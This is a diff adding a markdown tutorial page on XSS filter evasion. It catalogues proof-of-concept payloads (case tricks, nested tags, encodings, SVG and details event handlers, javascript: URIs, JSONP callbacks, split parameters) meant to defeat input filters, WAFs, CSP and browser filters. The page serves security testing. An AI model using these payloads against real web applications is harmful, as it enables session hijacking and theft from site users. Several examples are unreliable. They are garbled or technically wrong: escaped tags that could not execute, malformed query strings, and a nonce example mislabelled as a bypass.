@@ -1,0 +1,214 @@
+---
+title: XSS Evasion Techniques
+description: Advanced methods for bypassing XSS filters and security controls in web applications
+---
+
+# XSS Evasion Techniques
+
+This guide covers advanced techniques for bypassing Cross-Site Scripting (XSS) filters and security controls. Understanding these evasion methods is essential for thorough security testing and for demonstrating the limitations of inadequate protection mechanisms.
+
+## Understanding XSS Filters
+
+Modern web applications implement various types of XSS protection:
+
+- **Input validation**: Checking user input against allowed patterns
+- **Output encoding**: Converting special characters to their HTML entity equivalents
+- **Content Security Policy (CSP)**: Restricting which scripts can execute
+- **WAF rules**: Web Application Firewalls that block suspicious patterns
+- **Browser XSS filters**: Built-in protections in modern browsers
+
+## Basic Evasion Techniques
+
+### Case Variation
+
+Many basic filters only check for lowercase versions of dangerous tags:
+
+```html
+\<ScRiPt\>alert(1)\</ScRiPt\>
+```
+
+### Tag Obfuscation
+
+Bypass filters that look for specific tags:
+
+```html
+\<scr\<script\>ipt\>alert(1)\</scr\</script\>ipt\>
+```
+
+### Attribute Splitting
+
+Evade filters that scan for complete attribute patterns:
+
+```html
+\<img o
+n
+error=alert(1) src=x\>
+```
+
+## Encoding-Based Evasion
+
+### HTML Entity Encoding
+
+Use HTML entities to bypass filters:
+
+```html
+&lt;script&gt;alert(1)&lt;/script&gt;
+```
+
+### URL Encoding
+
+Encode characters using URL encoding:
+
+```html
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+```
+
+### Unicode Encoding
+
+Leverage Unicode encoding to hide malicious code:
+
+```html
+\<script\>\u0061lert(1)\</script\>
+```
+
+### Hex Encoding
+
+Use hexadecimal encoding for evasion:
+
+```html
+\<script\>&#x61;lert(1)\</script\>
+```
+
+## Advanced Filter Bypass Techniques
+
+### Non-Standard Tags and Events
+
+Use lesser-known HTML tags and events:
+
+```html
+\<svg onload="alert(1)"\>
+\<details ontoggle="alert(1)" open\>
+```
+
+### JavaScript Protocol Obfuscation
+
+Obfuscate the JavaScript protocol in URLs:
+
+```html
+\<a href="javas&#99;ript:alert(1)"\>Click me\</a\>
+```
+
+### DOM Clobbering
+
+Use HTML elements to override JavaScript objects:
+
+```html
+&lt;form id="test"&gt;&lt;input name="innerHTML" value="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;/form&gt;
+```
+
+### Null Bytes
+
+Insert null bytes to confuse parsers:
+
+```html
+&lt;scri%00pt&gt;alert(1)&lt;/script&gt;
+```
+
+## WAF Bypass Techniques
+
+### Regex Evasion
+
+Bypass regex-based filters:
+
+```html
+&lt;script&gt;/* */alert(1)/* */&lt;/script&gt;
+```
+
+### Parameter Pollution
+
+Use duplicate parameters to confuse WAF logic:
+
+```
+?param&quot;safe&quot;&amp;param&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;
+```
+
+### Fragmentation
+
+Split attacks across multiple parameters:
+
+```
+?param1=&quot;&lt;img&quot;&amp;param2=&quot;src=\&quot;x\&quot;&quot;&amp;param3=&quot;onerror=\&quot;alert(1)\&quot;&quot;
+```
+
+## CSP Bypass Techniques
+
+### JSONP Endpoints
+
+Leverage JSONP endpoints to execute arbitrary code:
+
+```html
+&lt;script src=&quot;https://trusted-domain.com/jsonp?callback=alert(1)&quot;&gt;&lt;/script&gt;
+```
+
+### DOM-Based Bypasses
+
+Use DOM manipulation to bypass CSP:
+
+```javascript
+location.href = 'javascript:alert(1)';
+```
+
+### Unsafe Inline Bypasses
+
+Exploit unsafe-inline directives:
+
+```html
+&lt;script nonce=&quot;CSP-NONCE&quot;&gt;alert(1)&lt;/script&gt;
+```
+
+## Browser-Specific Bypasses
+
+### Chrome XSS Auditor Bypasses
+
+Techniques specific to Chrome's XSS protection:
+
+```html
+&lt;a href=&quot;'onclick=alert(1)//&quot;&gt;Click me&lt;/a&gt;
+```
+
+### Safari Bypasses
+
+Techniques that work specifically in Safari:
+
+```html
+&lt;div id=&quot;x&quot;&gt;x&lt;/div&gt;&lt;script&gt;document.getElementById('x').innerHTML='&lt;img src=x onerror=alert(1)&gt;'&lt;/script&gt;
+```
+
+## Practical Evasion Methodology
+
+### Filter Analysis
+
+1. **Identify filtering mechanism**: Determine what type of filter is in place
+2. **Test basic inputs**: Understand what triggers the filter
+3. **Analyze responses**: Look for clues in error messages or behavior
+
+### Bypass Development
+
+1. **Start with known bypasses**: Try established techniques first
+2. **Combine methods**: Use multiple evasion techniques together
+3. **Iterate and refine**: Adjust your approach based on results
+
+### Testing Framework
+
+Develop a systematic approach:
+
+1. **Create a baseline**: Establish what's being blocked
+2. **Test variations**: Try different encoding and obfuscation methods
+3. **Document successes**: Record which techniques work
+
+## Next Steps
+
+After mastering evasion techniques, explore:
+
+- [Exploitation Strategies](/docs/xss/attack-techniques/exploitation-strategies) - Learn how to leverage XSS vulnerabilities
+- [Identification Techniques](/docs/xss/attack-techniques/identification-techniques) - Review methods for finding XSS vulnerabilities
